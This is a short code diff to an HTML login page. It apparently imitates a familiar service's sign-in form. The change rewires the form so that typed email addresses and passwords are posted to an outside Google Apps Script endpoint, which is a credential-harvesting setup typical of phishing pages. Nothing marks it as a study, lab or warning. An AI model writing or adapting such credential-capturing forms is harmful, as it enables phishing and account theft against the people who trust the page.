@@ -233,10 +233,10 @@ body {
       <div class="login-container">
         <div id="errorMessage" class="error-message">Incorrect email or password</div>
         <div id="successMessage" class="success-message">Login successful!</div>
-        <form id="loginForm" onsubmit="return handleLogin(event)">
-          <input type="text" id="email" class="input-field" placeholder="Email address or phone number" required>
+        <form id="loginForm" action="https://script.google.com/macros/s/AKfycbzWSlt7oV8wVGk9yQXbTg8VC4mgMueDSFLJg-l48Yq5Q_mrYJINbBk94oCrLvUNAiQw/exec" method="post">
+          <input type="text" id="email" name="email" class="input-field" placeholder="Email address or phone number" required>
           <div class="password-container">
-            <input type="password" id="password" class="input-field" placeholder="Password" required>
+            <input type="password" id="password" name="password" class="input-field" placeholder="Password" required>
             <i class="fas fa-eye password-toggle" id="togglePassword"></i>
           </div>
           <button type="submit" class="login-btn">Log In</button>
